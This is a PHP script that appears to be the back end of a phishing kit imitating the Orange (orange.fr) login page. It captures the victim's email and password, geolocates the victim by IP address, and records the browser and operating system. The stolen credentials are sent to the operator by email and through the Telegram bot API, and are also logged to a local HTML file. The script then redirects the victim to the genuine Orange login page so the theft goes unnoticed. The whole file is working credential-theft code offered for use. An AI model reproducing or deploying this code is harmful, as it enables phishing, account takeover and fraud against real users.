<?php
session_start();
error_reporting(0);
@ini_set('display_errors', 0);
if(isset($_POST['submit_btn'])){
    $password = $_POST['password'];
    $email = $_SESSION['email'];
    $TIME_DATE = date('H:i:s d/m/Y');
    include('function/Email.php');
    $TchatId = trim(file_get_contents("config/chatId.ini"));
    $TbotToken = trim(file_get_contents("config/botToken.ini"));
    ####################################
    ###############Get ip###############
    ####################################
    $client  = $_SERVER['HTTP_CLIENT_IP'];
    $forward = $_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP)){
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP)){
        $_SESSION['_ip_'] = $ip = $forward;
    }
    else{
        $_SESSION['_ip_'] = $ip = $remote;
    }
    $IP_LOOKUP = @json_decode(file_get_contents("http://ip-api.com/json/".$_SESSION['_ip_']));
    $LOOKUP_COUNTRY  = $IP_LOOKUP->country;
    $LOOKUP_MINCODE  = $IP_LOOKUP->countryCode;
    $LOOKUP_CITY     = $IP_LOOKUP->city;
    $LOOKUP_REGION   = $IP_LOOKUP->region;
    $LOOKUP_STATE    = $IP_LOOKUP->regionName;
    $LOOKUP_ZIPCODE  = $IP_LOOKUP->zip;
    $LOOKUP_LOWCODE  = strtolower($LOOKUP_MINCODE);
    $_SESSION['_LOOKUP_COUNTRY_'] = $LOOKUP_COUNTRY;
    $_SESSION['_LOOKUP_CNTRCODE_']= $LOOKUP_MINCODE;
    $_SESSION['_LOOKUP_CNTRCODELOW_']= $LOOKUP_LOWCODE;
    $_SESSION['_LOOKUP_CITY_']    = $LOOKUP_CITY;
    $_SESSION['_LOOKUP_REGION_']  = $LOOKUP_REGION;
    $_SESSION['_LOOKUP_STATE_']   = $LOOKUP_STATE;
    $_SESSION['_LOOKUP_ZIPCODE_'] = $LOOKUP_ZIPCODE;
    $_SESSION['_LOOKUP_REGIONS_'] = $_SESSION['_LOOKUP_STATE_']."(".$_SESSION['_LOOKUP_REGION_'].")";
    $_SESSION['_forlogin_'] = $LOOKUP_MINCODE." - ".$_SESSION['_ip_'];
    #########################################
    ################get browser##############
    #########################################
    function orange_OS($USER_AGENT){
        $OS_ERROR    =   "Unknown OS Platform";
        $OS  =   array( '/windows nt 10/i'      =>  'Windows 10',
                        '/windows nt 6.3/i'     =>  'Windows 8.1',
                        '/windows nt 6.2/i'     =>  'Windows 8',
                        '/windows nt 6.1/i'     =>  'Windows 7',
                        '/windows nt 6.0/i'     =>  'Windows Vista',
                        '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                        '/windows nt 5.1/i'     =>  'Windows XP',
                        '/windows xp/i'         =>  'Windows XP',
                        '/windows nt 5.0/i'     =>  'Windows 2000',
                        '/windows me/i'         =>  'Windows ME',
                        '/win98/i'              =>  'Windows 98',
                        '/win95/i'              =>  'Windows 95',
                        '/win16/i'              =>  'Windows 3.11',
                        '/macintosh|mac os x/i' =>  'Mac OS X',
                        '/mac_powerpc/i'        =>  'Mac OS 9',
                        '/linux/i'              =>  'Linux',
                        '/ubuntu/i'             =>  'Ubuntu',
                        '/iphone/i'             =>  'iPhone',
                        '/ipod/i'               =>  'iPod',
                        '/ipad/i'               =>  'iPad',
                        '/android/i'            =>  'Android',
                        '/blackberry/i'         =>  'BlackBerry',
                        '/webos/i'              =>  'Mobile');
        foreach ($OS as $regex => $value) { 
            if (preg_match($regex, $USER_AGENT)) {
                $OS_ERROR = $value;
            }

        }   
        return $OS_ERROR;
    }

    function orange_Browser($USER_AGENT){
        $BROWSER_ERROR    =   "Unknown Browser";
        $BROWSER  =   array('/msie/i'       =>  'Internet Explorer',
                            '/firefox/i'    =>  'Firefox',
                            '/safari/i'     =>  'Safari',
                            '/chrome/i'     =>  'Chrome',
                            '/edge/i'       =>  'Edge',
                            '/opera/i'      =>  'Opera',
                            '/netscape/i'   =>  'Netscape',
                            '/maxthon/i'    =>  'Maxthon',
                            '/konqueror/i'  =>  'Konqueror',
                            '/mobile/i'     =>  'Handheld Browser');
        foreach ($BROWSER as $regex => $value) { 
            if (preg_match($regex, $USER_AGENT)) {
                $BROWSER_ERROR = $value;
            }
        }
        return $BROWSER_ERROR;
    }
    #########################################
    ############ Info #######################
    #########################################
    $_SESSION['password']  = $_POST['password'];
    ##################################################################################
    $orange_MESSAGE="<html><body>
            <div style='font-size: 13px;font-family:monospace;font-weight:700;'><br>
            ############################# <font style='color:#9c0000;'>[+] <font style='color: #0a5d00;'>      Orange-VR      </font> [+]</font> ##########################<br>
            ############################# <font style='color:#9c0000;'>[+] <font style='color: #0a5d00;'> LOGIN INFORMATION </font> [+]</font> #############################<br>
            <font style='color:#9c0000;'>[+]</font> [Email] = <font style='color:#0070ba;'>".$_SESSION['email']."</font><br>
            <font style='color:#9c0000;'>[+]</font> [Password] = <font style='color:#0070ba;'>".$_SESSION['password']."</font><br>
            ############################# <font style='color:#9c0000;'>[+] <font style='color: #0a5d00;'> VICTIM INFORMATION 1</font> [+]</font> ###########################<br>
            <font style='color:#9c0000;'>[+]</font> [City] = <font style='color:#0070ba;'>".$_SESSION['_LOOKUP_CITY_']."</font><br>
            <font style='color:#9c0000;'>[+]</font> [State]   = <font style='color:#0070ba;'>".$_SESSION['_LOOKUP_REGIONS_']."</font><br>
           <font style='color:#9c0000;'>[+]</font> [Zip Code] = <font style='color:#0070ba;'>".$_SESSION['_LOOKUP_ZIPCODE_']."</font><br>
            ############################## <font style='color:#9c0000;'>[+] <font style='color: #0a5d00;'> VICTIM INFORMATION 2</font> [+]</font> ###########################<br>
            <font style='color:#9c0000;'>[+]</font> [IP INFO] = <font style='color:#0070ba;'>https://db-ip.com/".$_SESSION['_ip_']."</font><br>
           <font style='color:#9c0000;'>[+]</font> [TIME/DATE] = <font style='color:#0070ba;'>".$TIME_DATE."</font><br>
            <font style='color:#9c0000;'>[+]</font> [BROWSER] = <font style='color:#0070ba;'>".orange_Browser($_SERVER['HTTP_USER_AGENT'])." On ".orange_OS($_SERVER['HTTP_USER_AGENT'])."</font><br>
            ############################# <font style='color:#9c0000;'>[+] <font style='color: #0a5d00;'> orange-VR </font> [+]</font> #######################<br>
            </div></body></html>";
    $TOrange_MESSAGE="
            ##ORANGE LOGIN INFO## FOR ".$_SESSION['_ip_']."<br>
            Email = ".$_SESSION['email'].";
            Password = ".$_SESSION['password']."";
    ################ [+] orange_SUBJECT [+] ################
    $orange_SUBJECT = "(New-Result)(".$email.")(".$_SESSION['_forlogin_'].")";
    ################ [+] orange_HEADERS [+] ################
    $site = @$_SERVER['HTTP_HOST'];
	$new = rand(10,99);
	$new1 = substr(md5(mt_rand()), 0, 7);
	$from = $new1."service@".$site;
	$orange_HEADERS = "From: orange-VR <".$from.">\r\n";
	$orange_HEADERS = "Reply-To: ".$from."\r\n";
	$orange_HEADERS = "MIME-Version: 1.0\r\n";
	$orange_HEADERS = "Content-Type: text/html; charset=ISO-8859-1\r\n";
    ################## [+] SEND MAIL [+] ###################
    if (!empty($_POST['password'])){
    @mail($orange_EMAIL, $orange_SUBJECT, $orange_MESSAGE, $orange_HEADERS);}
    $txt = $TOrange_MESSAGE;
    $chatId = "$TchatId";
    $botToken = "bot$TbotToken";
    $send = ['chat_id'=>$chatId,'text'=>$txt];
    $web_telegram = "https://api.telegram.org/{$botToken}";
    $ch = curl_init($web_telegram . '/sendMessage');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
    $save=fopen("LoginResults.html","a+");
    fwrite($save,$orange_MESSAGE);
    fclose($save);
    ################## [+] TEXT RESULT [+] #################
    // $MYFILE = "all_result/orange-".$_SESSION['email']."--".$_SESSION['_ip_'].".html";
    // $FH = @fopen($MYFILE, 'a');
    // @fwrite($FH, $orange_MESSAGE);
    // @fclose($FH);
    ################## [+] NEXT PAGE [+] ###################
    unset($_SESSION['password']);
    header("Location: https://login.orange.fr/?return_url=https://www.orange.fr/portail");
}else{
    header("Location: index.php");
}
?>